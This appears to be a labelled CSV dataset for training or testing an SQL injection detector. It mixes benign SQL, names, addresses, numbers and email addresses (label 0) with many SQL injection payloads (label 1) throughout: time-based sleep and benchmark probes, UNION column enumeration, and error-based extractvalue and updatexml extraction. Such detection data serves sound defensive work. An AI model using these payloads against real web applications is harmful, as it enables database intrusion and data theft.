Query,Label
SELECT wp_posts.* FROM wp_posts WHERE 1 = 1 AND wp_posts.post_name IN  ( 'our-family-template' )  AND  (  0  =  1  )  AND wp_posts.post_type  =  'wp_template' AND   (  (  wp_posts.post_status  =  'publish'  )  )   GROUP BY wp_posts.ID ORDER BY wp_posts.post_date DESC,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 239190 )  ORDER BY meta_id ASC",0
"c/ la lila, 83,",0
SELECT COUNT ( DISTINCT corner )  FROM finish,0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'qipt'  =  'qipt",1
SELECT * FROM feed WHERE date BETWEEN direction09/01/1996breathe AND grain15/31/1996jar,0
-3566%' or 2158  =  6289,1
"1'  )   where 9381  =  9381 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1
"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  ""jzmg""  =  ""jzmg",1
SELECT * FROM  ( SELECT serious FROM salt ) ,0
SELECT * FROM family WHERE national = 'finish'  AND  ( thousand = 'how' OR shout = 'pan' ) ,0
e5670cij3,0
"  SELECT mayID AS ID, scientist AS rear FROM tall",0
olivio,0
SELECT * FROM above WHERE simple = 'research',0
SELECT * FROM firm 3,0
"1'||  (  select 'hrpa' where 1973  =  1973 union all select null,null,null,null,null,null,null,null,null--",1
SELECT COUNT ( chamber ) FROM managed,0
"1""  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  ""azpb""  =  ""azpb",1
"1%'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",1
-8409   )    )    as ipbz where 9984  =  9984 or 3371  =  3869,1
-1662 where 1119  =  1119 or   (  8459  =  8459  )  *4906--,1
nancy,0
SELECT * FROM can  WHERE widely NOT LIKE '[meant]%',0
SELECT QUARTER ( CURDATE (   )  )  ;,0
isolina,0
1'+  (  select ejaj where 1651  =  1651 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  +',1
SELECT * FROM tax WHERE NOT move = 'probably'  AND NOT neck = 'strange',0
"   SELECT thy, think, paint FROM cast WHERE top  IS NULL",0
"1%""   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""%""  =  """,1
SELECT * FROM observe WHERE golden = 'various'  AND  ( character = 'gain' OR ball = 'dirty' ) ,0
6267,0
clay@parcalia.ml,0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   8535  =  8535",1
SELECT COUNT ( edge )  FROM property,0
"  SELECT REPLACE ( ""XYZ FGH XYZ"", ""X"", ""m"" ) ;",0
Ã½ or 1  =  1 --,1
yunquera de henares,0
8.90606E+14,0
1'+  (  select 'rsgi' where 2258  =  2258,1
"  SELECT byID AS ID, alphabet AS cover FROM jet",0
SELECT small ( s )  FROM force LEFT JOIN,0
SELECT * FROM band WHERE simplest BETWEEN individual09/01/1996example AND gradually15/31/1996dress,0
-8641%' order by 1--,1
"  SELECT quick AS impossible, chance AS [ability]  FROM breakfast",0
SELECT AVG ( car )  FROM tea  SELECT SUM ( this ) ,0
seto,0
"-9774'   )    )     )   union all select 6954,6954,6954#",1
"   SELECT Employees.column, COUNT ( Orders.stickID )  AS seeFROM    ( OrdersINNER JOIN leader ON Orders.winID  =  Employees.silenceID ) ",0
SELECT AVG ( shown ) FROM attack SELECT SUM ( change ) ,0
"-4091""   )    )     )   union all select 6694,6694--",1
1   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  5368  =  5368,1
"1  )   union all select null,null--",1
SELECT * FROM friend FETCH FIRST 3 ROWS ONLY,0
"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",1
6.60819E+15,0
"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",1
"1' in boolean mode  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  #",1
teosa,0
"1 union all select null,null,null--",1
SELECT * FROM society WHERE partly = 'pocket',0
"pl. poeta badenes, 48, 11-c",0
"-5205'   )    )    union all select 8592,8592,8592,8592,8592,8592--",1
"1""   )    )    as gprr where 5975  =  5975 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
SELECT * FROM shot  WHERE break NOT LIKE '[plenty]%',0
&apos; OR,1
" select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",1
"calle belen 10, 8a",0
SELECT * FROM  ( SELECT moon FROM human ) ,0
7242,0
1'+  (  select naiw where 4924  =  4924,1
"   SELECT sent,join,enjoy,putting,vast     (  (  average JOIN extra ON visit.good =  dust.higher )   INNER JOIN shownON Orders.till =  example.steadyID ) ",0
SELECT TOP 50 PERCENT * FROM instance SELECT * FROM widely FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM pack,0
"-2570"" or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""dmch"" like ""dmch",1
31252,0
"1""  )   and 2954  =  1256--",1
or 1  =  1/*,1
1'+  (  select 'njee' where 4101  =  4101 and 3090  =  7873  )  +',1
SELECT * FROM  ( SELECT birds FROM attached ) ,0
-9358' or 9887  =  2569--,1
SELECT * FROM  ( SELECT drove FROM slope ) ,0
SELECT * FROM pride WHERE pay = 'after'  AND  ( built = 'safe' OR brain = 'string' ) ,0
1'||  (  select 'aevx' from dual where 9999  =  9999,1
SELECT TOP 3 * FROM drink WHERE house = 'rear' SELECT * FROM himself,0
" SELECT column_name ( s )  FROM women,outside",0
SELECT AVG ( Price ) FROM guess,0
"1""  )   where 8588  =  8588",1
SELECT MIN ( else )  AS force FROM engineer,0
25514,0
begin dbms_lock.sleep  (  5  ) ,1
"1  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",1
SELECT * FROM meal WHERE brick = 'course'  OR island = 'feature',0
SELECT part ( s )  FROM found,0
vilma,0
"1'   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'jhle' like 'jhle",1
"SELECT * FROM differ WHERE signal BETWEEN ""living"" AND    ""arrangement""",0
3411,0
SELECT scientific FROM many,0
"-5998%""  )   union all select 2366,2366,2366,2366#",1
"1%""   )    )     )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"-5904"" where 9782  =  9782 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",1
"-5529"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  ",1
SELECT * FROM orbit WHERE popular = 'not' LIMIT 3,0
"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'qcsi'  =  'qcsi",1
DELETE FROM basket WHERE increase = 'cotton',0
-3161'  )   or 8501  =  1796,1
28011073v,0
select * from users where id  =  1 or \.<\ or 1  =  1 -- 1,1
4742,0
trigueros del valle,0
"  SELECT * FROM limited WHERE to NOT IN  ( 'struck', 'long', 'machine' )  ",0
"-5278""   )    )     )   union all select 5264,5264,5264#",1
 or userid like '%,1
SELECT AVG ( several ) FROM upward SELECT SUM ( identity ) ,0
SELECT MIN ( definition )  AS heard FROM facing,0
SELECT * FROM important WHERE pair LIKE '%safety%',0
"1'   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'brlc'  =  'brlc",1
1'+  (  select 'hcqf' where 9956  =  9956 and   (  2993  =  4297  )  *4297  )  +',1
"1   )    )    as cusv where 4871  =  4871 and elt  (  1210  =  1210,sleep  (  5   )    )   --",1
"   SELECT breakfast, proud+ ', ' + label+ ' ' + got+ ', ' + some AS neck  FROM bark",0
DELETE FROM belt WHERE also = 'information',0
1' and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'ucpa'  =  'ucpa,1
SELECT * FROM dull WHERE bite = 'changing' FETCH FIRST 3 ROWS ONLY,0
98097212g,0
laicismo,0
"-4596"" union all select 5761#",1
SELECT * FROM tone WHERE Price NOT BETWEEN 10 AND 20,0
eulalio,0
"1'  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"1""   )    )    union all select null,null,null,null,null,null,null#",1
"1   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  6265  =  6265",1
end  )  ||',1
8.41734E+15,0
"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",1
8485,0
1'||  (  select 'vasx' where 4770  =  4770 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||',1
rutledge,0
gowan,0
SELECT * FROM saved FETCH FIRST 50 PERCENT ROWS ONLY,0
"-3885  )   where 2387  =  2387 union all select 2387,2387,2387,2387,2387,2387,2387#",1
SELECT Count ( * )  AS language,0
SELECT * FROM storm ORDER BY fifty,0
SELECT * FROM flies ORDER BY voice DESC,0
SELECT * FROM serve FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM honor,0
nela,0
SELECT MIN ( information )  AS fear FROM society,0
"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'zetf'  =  'zetf",1
SELECT * FROM television FETCH FIRST 50 PERCENT ROWS ONLY,0
"  SELECT numeralID AS ID, nest AS alike FROM remarkable",0
" select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",1
goth,0
"1"" and 4996  =  4431 and ""jzaq""  =  ""jzaq",1
calle codigo correspondencia oficial correos-telegrafos 33,0
SELECT AVG ( visitor ) FROM dinner,0
31271,0
SELECT TOP 3 * FROM hello,0
1' where 4403  =  4403 rlike sleep  (  5  )  #,1
SELECT * FROM triangle WHERE Price NOT BETWEEN 10 AND 20,0
18653468p,0
26586,0
"1""  )   as vcir where 6275  =  6275 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
SELECT ocean FROM ran,0
SELECT AVG ( usual ) FROM three,0
SELECT * FROM president,0
"1 union all select null,null,null,null,null,null#",1
campoo de yuso,0
celfa,0
nona,0
SELECT * FROM hunter WHERE off = 'either'  AND  ( thing = 'little' OR each = 'question' ) ,0
"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",1
SELECT * FROM personal WHERE Price NOT BETWEEN 10 AND 20,0
13420,0
"-9315'   )    )     )   union all select 5057,5057,5057,5057,5057#",1
"carretera aeropuerto, 42,",0
pettinge,0
SELECT * FROM naturally ORDER BY meal DESC,0
SELECT AVG ( strong ) FROM loose SELECT SUM ( shade ) ,0
SELECT * FROM action WHERE catch = 'public',0
SELECT AVG ( sign ) FROM check SELECT SUM ( large ) ,0
SELECT friend ( s FROM month RIGHT JOIN,0
"1' where 4334  =  4334 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
"1  )   as zdym where 1578  =  1578 union all select null,null,null#",1
"1%'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",1
SELECT AVG ( explore ) FROM swept SELECT SUM ( model ) ,0
-3062'   )    )    or 6872  =  6872 and    (    (   'uzth' like 'uzth,1
SELECT * FROM seat FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM generally,0
1'   )    )    as jtmf where 3937  =  3937,1
"1'||  (  select 'zpwe' from dual where 7743  =  7743 union all select null,null#",1
bello.sandor@hipergipuzkoa.to,0
"  SELECT * FROM title WHERE captured NOT IN  ( 'addition', 'cookies', 'previous' )  ",0
SELECT * FROM collect WHERE newspaper BETWEEN '1996-07-01' AND '1996-07-31',0
"1""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""jywy"" like ""jywy",1
"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",1
" SELECT * FROM felt ORDER BY mind ASC, buy DESC",0
avda. fernando ferrerio s/n,0
"1%"" union all select null,null,null,null,null,null,null,null,null#",1
nelia3,0
"1  )   where 7978  =  7978 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
select   (  case when   (  3677  =  2193  )   then 3677 else 1/  (  select 0  )   end  )  --,1
SELECT TOP 3 * FROM stay SELECT * FROM until 3SELECT * FROM bar,0
1 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   # lexm,1
"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
eglevsky-dux@tacticlinks.ch,0
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_status_3142' LIMIT 1,0
"-8699""  )   union all select 8645,8645,8645,8645,8645,8645--",1
"pl. limeo 22, 5?e",0
63829565b,0
2.97358E+15,0
"1'  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
" SELECT * FROM something ORDER BY weak ASC, sugar DESC",0
"1%'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   '%'  =  '",1
"1""  )   where 1416  =  1416 union all select null,null,null#",1
SELECT TOP 50 PERCENT * FROM combination,0
"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'ocfi'  =  'ocfi",1
SELECT SEC_TO_TIME ( 1 ) ;,0
"1""   )    )     )   and 7533  =  7533 and    (    (     (  ""xopd""  =  ""xopd",1
2.24329E+15,0
"  SELECT scaredID AS ID, jungle AS rice FROM carefully",0
"  SELECT REPLACE ( ""XYZ FGH XYZ"", ""X"", ""M"" ) ;",0
SELECT * FROM wife WHERE split IN  ( SELECT rise FROM good ) ,0
d76en3r9n8z01,0
SELECT TOP 50 PERCENT * FROM officer SELECT * FROM single FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM move,0
9.90463E+15,0
"  SELECT * FROM club WHERE cabin IN  ( 'chart', 'thread', 'carried' )  ",0
"  SELECT dull,pick FROM hat WHERE fell = 'time' UNION SELECT think, process FROM sound",0
"1'||  (  select 'fdkl' where 4572  =  4572 union all select null,null,null,null,null,null,null,null,null#",1
1   )    )    and 4595  =  4595#,1
DELETE FROM busy,0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   'xlvt'  =  'xlvt",1
kostka5@institutoandaluzdelmar.an,0
1%' or sleep  (  5  )   and '%'  =  ',1
s5bal850de,0
"iif  (  1149  =  4765,1,1/0  )  ",1
SELECT though ( s )  FROM opposite SELECT sure FROM younger,0
"select count  (  *  )   from generate_series  (  1,5000000  )   and ""xcjt""  =  ""xcjt",1
"-5832""  )   or 1650  =  9011--",1
"1'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
" SELECT * FROM fruit ORDER BY action, fear",0
SELECT * FROM police WHERE frame = 'fifty'  AND  ( plain = 'noise' OR court = 'should' ) ,0
SELECT * FROM bar WHERE describe = 'second',0
"-8881%' union all select 8420,8420,8420,8420,8420,8420,8420#",1
SELECT * FROM pan WHERE thumb = 'fair'  OR nature = 'pole',0
"1'  )   as dajk where 1452  =  1452 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
ezella,0
torres de berrelln,0
SELECT MIN ( plate )  AS fill FROM apart,0
" SELECT column_name ( s )  FROM pound,bet",0
1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  -- paxv,1
SELECT paint,0
jou de lagarza,0
2.1902E+15,0
cancio,0
SELECT * FROM riding WHERE firm = 'feet'  OR recall = 'may',0
"1'   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   'zjnp'  =  'zjnp",1
"1""   )    )    as ynuw where 9138  =  9138",1
SELECT AVG ( sink ) FROM outline SELECT SUM ( neighborhood ) ,0
"1""  )   as jaxh where 6318  =  6318 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1
SELECT mind FROM instrument UNION ALL SELECT example FROM extra ORDER BY pitch,0
"aldebaran 84,",0
SELECT * FROM order WHERE running BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT DISTINCT occasionally FROM wonder,0
SELECT TOP 50 PERCENT * FROM scene,0
"  UPDATE very SET anywhere =  'pressure', City =  'couple' WHERE pay =  but",0
m1n*6848,0
urrutia delems,0
SELECT * FROM fill FETCH FIRST 50 PERCENT ROWS ONLY,0
"1%' union all select null,null,null--",1
"1'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'xdce'  =  'xdce",1
vannuchhi_ecoffery@hotelesjerez.vc,0
"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""zhxm""  =  ""zhxm",1
1  )   where 5651  =  5651,1
1  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  3945  =  3945,1
"1'+  (  select zbyt where 4575  =  4575 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x   )    )   +'",1
SELECT * FROM shoe FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT MIN ( spirit )  AS plastic FROM expect,0
SELECT * FROM married,0
"1'||  (  select 'bnaz' from dual where 7168  =  7168 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
tewksbur,0
1'  )   where 5378  =  5378,1
"1,  (  select   (  case when   (  5726  =  5275  )   then 1 else 1/  (  select 0  )   end   )    )   ",1
willingham@necesitocurro.mq,0
sixto,0
SELECT * FROM suit 3 SELECT * FROM blue,0
SELECT TOP 3 * FROM aware WHERE after = 'doing',0
SELECT * FROM verb WHERE pay = 'thee' FETCH FIRST 3 ROWS ONLY,0
SELECT bend,0
"   SELECT COUNT ( stage ) , yourself FROM hardly BY fierce",0
68203466w,0
SELECT * FROM sum WHERE say = 'courage' FETCH FIRST 3 ROWS ONLY,0
"  SELECT joy,hunter,plastic FROM mission LEFT JOIN Orders ON child.finallyID =  corner.empty ORDER BY library.after",0
47343175k,0
delit@icods.ro,0
"1""  )   as cxwd where 5800  =  5800 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
SELECT MIN ( toy )  AS near FROM greatest,0
SELECT * FROM strike  WHERE sun NOT LIKE '[source]%',0
" select * from users where id  =  11<1# union select 1,version  (    )   -- 1",1
haker-durango@mirallesmoscardo.ro,0
"   SELECT hand, cook+ ', ' + audience+ ' ' + main+ ', ' + avoid AS adventure  FROM acres",0
DELETE FROM Customers  WHERE CustomerName = 'Alfreds Futterkiste';,0
gargajienta,0
"1'||  (  select 'fqoz' where 9794  =  9794 union all select null,null,null,null,null--",1
"1 where 7412  =  7412 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1""  )   where 5065  =  5065",1
"1""  )   where 2312  =  2312 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
SELECT * FROM by WHERE    NOT giant = 'school',0
"1""   )    )    and 9800  =  8713",1
6g369zar41,0
